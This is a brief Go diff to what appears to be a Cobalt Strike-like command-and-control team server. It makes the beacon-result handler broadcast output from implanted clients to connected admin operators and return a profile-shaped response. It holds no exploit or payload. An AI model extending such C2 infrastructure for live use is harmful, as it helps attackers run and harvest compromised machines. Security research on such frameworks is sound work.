@@ -5,6 +5,7 @@ import (
 	"NewCsTeamServer/config"
 	"NewCsTeamServer/crypt"
 	"NewCsTeamServer/profile"
+	"NewCsTeamServer/server/manager/admin"
 	"NewCsTeamServer/server/public"
 	"NewCsTeamServer/task"
 	"bytes"
@@ -114,8 +115,12 @@ func HandleBeaconResult(c *gin.Context) {
 	// 存储结果
 	//cm.AddResult(uint32(clientID), result)
 	log.Printf("收到客户端 %d 的结果: TaskID=%s, Output=%s", clientID, result.TaskID, string(result.Output))
-
-	// 返回成功响应
+	taskid, _ := strconv.Atoi(result.TaskID)
+	admin.GetConnectionManager().BroadcastToAdmins(admin.Message{ //广播结果
+		ID:      result.TaskID,
+		Type:    taskid,
+		Content: string(result.Output),
+	})
 	// 返回成功响应
 	retbody := append([]byte(profile.ProfileConfig.HttpGet.OutPutPrepend), []byte(profile.ProfileConfig.HttpGet.OutPutAppend)...)
 	c.Data(200, "application/octet-stream", retbody)
